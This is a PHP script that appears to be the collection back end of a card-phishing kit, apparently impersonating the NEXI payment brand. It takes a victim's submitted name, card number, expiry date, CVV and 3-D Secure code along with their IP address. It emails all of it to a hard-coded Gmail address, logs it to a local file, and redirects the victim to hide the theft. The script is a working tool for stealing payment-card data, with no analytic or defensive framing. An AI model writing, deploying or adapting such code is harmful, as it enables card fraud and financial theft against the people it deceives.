<?php   ob_start();  ?>
<?
include "Xc.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "==================================================\n";
$message .= "============xX  Xx======\n";
$message .= "FULL NAME               : ".$_POST['j1']."\n";
$message .= "CCS                  : ".$_POST['j2']."\n";
$message .= "month               : ".$_POST['j3']."\n";
$message .= "year               : ".$_POST['j4']."\n";
$message .= "CVV                  : ".$_POST['j5']."\n";
$message .= "3d                  : ".$_POST['j6']."\n";
$message .= "============xX Majid NEXI Xx=====\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | On Time : ".date("m/d/Y g:i:a")."\n";
$message .= "==================================================\n";

$send="omex1231231@gmail.com";
$subject = "vbv | ".$_POST['winners1']." | $ip";
$headers = "From: Kelly<noreply>";
@mail($send,$subject,$message,$from);
$file = fopen("../all.txt","a");
fwrite($file, $message);

@header("Location: ..//");